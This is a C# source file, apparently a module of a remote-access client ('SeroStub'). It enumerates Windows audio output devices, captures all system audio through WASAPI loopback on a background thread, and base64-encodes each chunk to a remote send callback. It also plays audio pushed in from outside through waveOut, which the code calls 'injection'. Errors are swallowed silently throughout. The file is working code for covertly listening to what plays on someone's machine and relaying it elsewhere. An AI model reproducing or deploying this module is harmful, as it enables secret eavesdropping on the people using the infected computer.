using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Text.Json;

namespace SeroStub;

internal static class SpeakerFeature
{
    // ── WASAPI COM interfaces (minimal subset) ─────────────
    private static readonly Guid CLSID_MMDeviceEnumerator = new("BCDE0395-E52F-467C-8E3D-C4579291692E");
    private static readonly Guid IID_IMMDeviceEnumerator  = new("A95664D2-9614-4F35-A746-DE8DB63617E6");
    private static readonly Guid IID_IAudioClient         = new("1CB9AD4C-DBFA-4c32-B178-C2F568A703B2");
    private static readonly Guid IID_IAudioCaptureClient  = new("C8ADBD64-E71E-48a0-A4DE-185C395CD317");

    private const int AUDCLNT_STREAMFLAGS_LOOPBACK = 0x00020000;
    private const int AUDCLNT_SHAREMODE_SHARED     = 0;
    private const int DEVICE_STATE_ACTIVE          = 1;
    private const int eRender                      = 0;
    private const int eConsole                     = 0;

    // WinMM waveOut (for injection playback)
    private const uint WAVE_MAPPER    = unchecked((uint)-1);
    private const uint CALLBACK_NULL  = 0;
    private const uint WHDR_DONE      = 0x00000001;

    [DllImport("ole32.dll")] private static extern int  CoCreateInstance(ref Guid clsid, nint inner, uint ctx, ref Guid iid, out nint ppv);
    [DllImport("ole32.dll")] private static extern int  CoInitializeEx(nint res, uint dwCoInit);
    [DllImport("ole32.dll")] private static extern void CoUninitialize();
    [DllImport("ole32.dll")] private static extern int  PropVariantClear(ref PROPVARIANT pv);

    [DllImport("winmm.dll")] private static extern uint waveOutOpen(out nint handle, uint dev, ref WAVEFORMATEX fmt, nint cb, nint inst, uint flags);
    [DllImport("winmm.dll")] private static extern uint waveOutPrepareHeader(nint handle, nint hdr, uint sz);
    [DllImport("winmm.dll")] private static extern uint waveOutWrite(nint handle, nint hdr, uint sz);
    [DllImport("winmm.dll")] private static extern uint waveOutUnprepareHeader(nint handle, nint hdr, uint sz);
    [DllImport("winmm.dll")] private static extern uint waveOutReset(nint handle);
    [DllImport("winmm.dll")] private static extern uint waveOutClose(nint handle);

    private static nint Vtbl(nint com, int n) => Marshal.ReadIntPtr(Marshal.ReadIntPtr(com), n * IntPtr.Size);

    // IMMDeviceEnumerator delegates
    private delegate int EnumEndpointsDelegate(nint self, int flow, int state, out nint col);
    private delegate int GetDefaultEndpointDelegate(nint self, int flow, int role, out nint dev);
    private delegate int GetCountDelegate(nint self, out int cnt);
    private delegate int ItemDelegate(nint self, int n, out nint dev);
    private delegate int ActivateDelegate(nint self, ref Guid iid, uint ctx, nint parm, out nint iface);
    private delegate int GetIdDelegate(nint self, out nint id);
    private delegate int GetMixFormatDelegate(nint self, out nint fmt);
    private delegate int InitializeDelegate(nint self, int mode, int flags, long dur, long per, nint fmt, nint sid);
    private delegate int GetServiceDelegate(nint self, ref Guid iid, out nint ppv);
    private delegate int StartDelegate(nint self);
    private delegate int StopDelegate2(nint self);
    private delegate int GetBufferDelegate(nint self, out int frames, out nint data, out uint flags, out ulong pos, out ulong qpc);
    private delegate int ReleaseBufferDelegate(nint self, int frames, uint flags);
    private delegate int OpenPropertyStoreDelegate(nint self, uint mode, out nint store);
    private delegate int GetValueDelegate(nint self, ref PROPERTYKEY key, out PROPVARIANT val);

    [StructLayout(LayoutKind.Sequential)]
    private struct PROPVARIANT
    {
        public ushort vt;
        public ushort pad1, pad2, pad3;
        public nint   pwszVal;  // VT_LPWSTR at offset 8 on 64-bit
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct PROPERTYKEY { public Guid fmtid; public uint pid; }

    // pkey for PKEY_Device_FriendlyName
    private static readonly PROPERTYKEY PKEY_FriendlyName = new()
    {
        fmtid = new Guid("a45c254e-df1c-4efd-8020-67d146a850e0"),
        pid   = 14
    };

    // ── Loopback capture state ─────────────────────────────
    private static volatile bool   _running;
    private static Thread?         _thread;
    private static Func<string, System.Threading.Tasks.Task>? _send;
    private static readonly SpeakerDataStub _buf = new();

    // ── Injection (waveOut) state ──────────────────────────
    private static nint _outHandle;
    private static volatile bool _injecting;
    private static readonly ConcurrentQueue<(GCHandle hdr, GCHandle data)> _pendingHdrs = new();

    // ── Public API ─────────────────────────────────────────

    internal static string GetDevices()
    {
        var devs = new List<SpeakerDeviceStub>();
        try
        {
            CoInitializeEx(nint.Zero, 0);
            var clsid = CLSID_MMDeviceEnumerator;
            var iid   = IID_IMMDeviceEnumerator;
            if (CoCreateInstance(ref clsid, nint.Zero, 1, ref iid, out var enm) != 0)
                return JsonSerializer.Serialize(new SpeakerDevicesResultStub(), SeroJson.Default.SpeakerDevicesResultStub);

            var getDefault = Marshal.GetDelegateForFunctionPointer<GetDefaultEndpointDelegate>(Vtbl(enm, 4));
            var enumEndpts = Marshal.GetDelegateForFunctionPointer<EnumEndpointsDelegate>(Vtbl(enm, 3));

            if (getDefault(enm, eRender, eConsole, out var def) == 0 && def != nint.Zero)
            {
                var (sr, ch, bps) = GetDeviceAudioFormat(def);
                devs.Add(new SpeakerDeviceStub { Index = -1, Name = GetDeviceName(def) + " (Default)", SampleRate = sr, Channels = ch, BitsPerSample = bps });
                Marshal.Release(def);
            }

            if (enumEndpts(enm, eRender, DEVICE_STATE_ACTIVE, out var col) == 0 && col != nint.Zero)
            {
                var getCount = Marshal.GetDelegateForFunctionPointer<GetCountDelegate>(Vtbl(col, 3));
                var item     = Marshal.GetDelegateForFunctionPointer<ItemDelegate>(Vtbl(col, 4));
                getCount(col, out int cnt);
                for (int i = 0; i < cnt; i++)
                {
                    if (item(col, i, out var d) == 0 && d != nint.Zero)
                    {
                        var (sr, ch, bps) = GetDeviceAudioFormat(d);
                        devs.Add(new SpeakerDeviceStub { Index = i, Name = GetDeviceName(d), SampleRate = sr, Channels = ch, BitsPerSample = bps });
                        Marshal.Release(d);
                    }
                }
                Marshal.Release(col);
            }
            Marshal.Release(enm);
        }
        catch { }
        return JsonSerializer.Serialize(new SpeakerDevicesResultStub { Devices = devs }, SeroJson.Default.SpeakerDevicesResultStub);
    }

    internal static void Start(int deviceIndex, Func<string, System.Threading.Tasks.Task> sendData)
    {
        if (_running) Stop();
        _running = true;
        _send    = sendData;
        _thread  = new Thread(() => CaptureLoop(deviceIndex)) { IsBackground = true };
        _thread.Start();
    }

    internal static void Stop()
    {
        _running = false;
        _thread?.Join(3000);
        _thread = null;
    }

    internal static void StartInjection(int sampleRate, int channels, int bitsPerSample)
    {
        StopInjection();
        var fmt = new WAVEFORMATEX
        {
            wFormatTag      = 1, // PCM
            nChannels       = (ushort)channels,
            nSamplesPerSec  = (uint)sampleRate,
            wBitsPerSample  = (ushort)bitsPerSample,
            nBlockAlign     = (ushort)(channels * bitsPerSample / 8),
            nAvgBytesPerSec = (uint)(sampleRate * channels * bitsPerSample / 8),
            cbSize          = 0,
        };
        if (waveOutOpen(out _outHandle, WAVE_MAPPER, ref fmt, nint.Zero, nint.Zero, CALLBACK_NULL) == 0)
            _injecting = true;
    }

    internal static void FeedInjection(byte[] data)
    {
        if (!_injecting || _outHandle == nint.Zero) return;

        // Recycle completed buffers
        while (_pendingHdrs.TryPeek(out var peek))
        {
            var snap = Marshal.PtrToStructure<WAVEHDR>(peek.hdr.AddrOfPinnedObject());
            if ((snap.dwFlags & WHDR_DONE) == 0) break;
            if (!_pendingHdrs.TryDequeue(out var done)) break;
            waveOutUnprepareHeader(_outHandle, done.hdr.AddrOfPinnedObject(), (uint)Marshal.SizeOf<WAVEHDR>());
            done.hdr.Free(); done.data.Free();
        }

        // Enqueue new buffer
        var dataHandle = GCHandle.Alloc(data, GCHandleType.Pinned);
        var hdr = new WAVEHDR { lpData = dataHandle.AddrOfPinnedObject(), dwBufferLength = (uint)data.Length };
        var hdrHandle = GCHandle.Alloc(hdr, GCHandleType.Pinned);
        nint hdrPtr = hdrHandle.AddrOfPinnedObject();

        if (waveOutPrepareHeader(_outHandle, hdrPtr, (uint)Marshal.SizeOf<WAVEHDR>()) == 0)
        {
            waveOutWrite(_outHandle, hdrPtr, (uint)Marshal.SizeOf<WAVEHDR>());
            _pendingHdrs.Enqueue((hdrHandle, dataHandle));
        }
        else { hdrHandle.Free(); dataHandle.Free(); }
    }

    internal static void StopInjection()
    {
        _injecting = false;
        if (_outHandle != nint.Zero)
        {
            waveOutReset(_outHandle);
            while (_pendingHdrs.TryDequeue(out var h))
            {
                try
                {
                    waveOutUnprepareHeader(_outHandle, h.hdr.AddrOfPinnedObject(), (uint)Marshal.SizeOf<WAVEHDR>());
                    h.hdr.Free(); h.data.Free();
                }
                catch { }
            }
            waveOutClose(_outHandle);
            _outHandle = nint.Zero;
        }
    }

    // ── Private helpers ────────────────────────────────────

    private static string GetDeviceName(nint dev)
    {
        try
        {
            // IMMDevice::OpenPropertyStore (vtbl 4)
            var openPropStore = Marshal.GetDelegateForFunctionPointer<OpenPropertyStoreDelegate>(Vtbl(dev, 4));
            if (openPropStore(dev, 0u, out var store) == 0 && store != nint.Zero)
            {
                // IPropertyStore::GetValue (vtbl 5)
                var getValue = Marshal.GetDelegateForFunctionPointer<GetValueDelegate>(Vtbl(store, 5));
                var pk = PKEY_FriendlyName;
                getValue(store, ref pk, out var pv);

                const ushort VT_LPWSTR = 31;
                string name = "";
                if (pv.vt == VT_LPWSTR && pv.pwszVal != nint.Zero)
                    name = Marshal.PtrToStringUni(pv.pwszVal) ?? "";
                PropVariantClear(ref pv);
                Marshal.Release(store);

                if (!string.IsNullOrEmpty(name)) return name;
            }
        }
        catch { }

        // Fallback: short GUID fragment
        try
        {
            var getId = Marshal.GetDelegateForFunctionPointer<GetIdDelegate>(Vtbl(dev, 5));
            if (getId(dev, out var idPtr) == 0 && idPtr != nint.Zero)
            {
                var id = Marshal.PtrToStringUni(idPtr) ?? "";
                Marshal.FreeCoTaskMem(idPtr);
                var parts = id.Split('{', '}');
                return parts.Length >= 2 ? parts[1][..8] : id;
            }
        }
        catch { }
        return "Unknown";
    }

    private static (int sampleRate, int channels, int bitsPerSample) GetDeviceAudioFormat(nint dev)
    {
        try
        {
            var acIid    = IID_IAudioClient;
            var activate = Marshal.GetDelegateForFunctionPointer<ActivateDelegate>(Vtbl(dev, 3));
            if (activate(dev, ref acIid, 1, nint.Zero, out var ac) != 0 || ac == nint.Zero)
                return (44100, 2, 32);

            var getMixFmt = Marshal.GetDelegateForFunctionPointer<GetMixFormatDelegate>(Vtbl(ac, 8));
            getMixFmt(ac, out var fmtPtr);
            Marshal.Release(ac);

            if (fmtPtr != nint.Zero)
            {
                var wfx = Marshal.PtrToStructure<WAVEFORMATEX>(fmtPtr);
                Marshal.FreeCoTaskMem(fmtPtr);
                return ((int)wfx.nSamplesPerSec, wfx.nChannels, wfx.wBitsPerSample);
            }
        }
        catch { }
        return (44100, 2, 32);
    }

    private static void CaptureLoop(int deviceIndex)
    {
        CoInitializeEx(nint.Zero, 0);
        try
        {
            var clsid = CLSID_MMDeviceEnumerator;
            var iid   = IID_IMMDeviceEnumerator;
            if (CoCreateInstance(ref clsid, nint.Zero, 1, ref iid, out var enm) != 0) return;

            nint dev = nint.Zero;
            if (deviceIndex < 0)
            {
                var getDef = Marshal.GetDelegateForFunctionPointer<GetDefaultEndpointDelegate>(Vtbl(enm, 4));
                getDef(enm, eRender, eConsole, out dev);
            }
            else
            {
                var enumEp = Marshal.GetDelegateForFunctionPointer<EnumEndpointsDelegate>(Vtbl(enm, 3));
                if (enumEp(enm, eRender, DEVICE_STATE_ACTIVE, out var col) == 0)
                {
                    var item = Marshal.GetDelegateForFunctionPointer<ItemDelegate>(Vtbl(col, 4));
                    item(col, deviceIndex, out dev);
                    Marshal.Release(col);
                }
            }
            Marshal.Release(enm);
            if (dev == nint.Zero) return;

            var acIid    = IID_IAudioClient;
            var activate = Marshal.GetDelegateForFunctionPointer<ActivateDelegate>(Vtbl(dev, 3));
            activate(dev, ref acIid, 1, nint.Zero, out var ac);
            Marshal.Release(dev);
            if (ac == nint.Zero) return;

            var getMixFmt = Marshal.GetDelegateForFunctionPointer<GetMixFormatDelegate>(Vtbl(ac, 8));
            getMixFmt(ac, out var fmtPtr);
            var init    = Marshal.GetDelegateForFunctionPointer<InitializeDelegate>(Vtbl(ac, 3));
            long bufDur = 10_000_000;
            init(ac, AUDCLNT_SHAREMODE_SHARED, AUDCLNT_STREAMFLAGS_LOOPBACK, bufDur, 0, fmtPtr, nint.Zero);

            var capIid = IID_IAudioCaptureClient;
            var getSvc = Marshal.GetDelegateForFunctionPointer<GetServiceDelegate>(Vtbl(ac, 14));
            getSvc(ac, ref capIid, out var cap);
            if (cap == nint.Zero) { Marshal.Release(ac); return; }

            var startAc = Marshal.GetDelegateForFunctionPointer<StartDelegate>(Vtbl(ac, 10));
            var getBuf  = Marshal.GetDelegateForFunctionPointer<GetBufferDelegate>(Vtbl(cap, 3));
            var relBuf  = Marshal.GetDelegateForFunctionPointer<ReleaseBufferDelegate>(Vtbl(cap, 4));

            int frameBytes = 4;
            if (fmtPtr != nint.Zero)
            {
                var wfx = Marshal.PtrToStructure<WAVEFORMATEX>(fmtPtr);
                frameBytes = wfx.nBlockAlign;
                Marshal.FreeCoTaskMem(fmtPtr);
            }

            startAc(ac);
            while (_running)
            {
                if (getBuf(cap, out int frames, out nint dataPtr, out _, out _, out _) == 0 && frames > 0)
                {
                    int bytes = frames * frameBytes;
                    var chunk = System.Buffers.ArrayPool<byte>.Shared.Rent(bytes);
                    try
                    {
                        Marshal.Copy(dataPtr, chunk, 0, bytes);
                        _buf.Data = Convert.ToBase64String(chunk, 0, bytes);
                        var payload = JsonSerializer.Serialize(_buf, SeroJson.Default.SpeakerDataStub);
                        _send?.Invoke(payload);
                    }
                    finally { System.Buffers.ArrayPool<byte>.Shared.Return(chunk); }
                    relBuf(cap, frames, 0);
                }
                else Thread.Sleep(10);
            }

            var stopAc = Marshal.GetDelegateForFunctionPointer<StopDelegate2>(Vtbl(ac, 11));
            stopAc(ac);
            Marshal.Release(cap);
            Marshal.Release(ac);
        }
        catch { }
        finally { CoUninitialize(); }
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEFORMATEX
    {
        public ushort wFormatTag;
        public ushort nChannels;
        public uint   nSamplesPerSec;
        public uint   nAvgBytesPerSec;
        public ushort nBlockAlign;
        public ushort wBitsPerSample;
        public ushort cbSize;
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct WAVEHDR
    {
        public nint  lpData;
        public uint  dwBufferLength;
        public uint  dwBytesRecorded;
        public nint  dwUser;
        public uint  dwFlags;
        public uint  dwLoops;
        public nint  lpNext;
        public nint  reserved;
    }
}

internal class SpeakerDeviceStub
{
    public int    Index        { get; set; }
    public string Name         { get; set; } = "";
    public int    SampleRate   { get; set; } = 44100;
    public int    Channels     { get; set; } = 2;
    public int    BitsPerSample{ get; set; } = 32;
}
internal class SpeakerDevicesResultStub  { public List<SpeakerDeviceStub> Devices { get; set; } = []; }
internal class SpeakerStartDataStub      { public int DeviceIndex { get; set; } = -1; }
internal class SpeakerDataStub           { public string Data { get; set; } = ""; }
internal class SpeakerInjectStartDataStub{ public int SampleRate { get; set; } = 44100; public int Channels { get; set; } = 1; public int BitsPerSample { get; set; } = 16; }
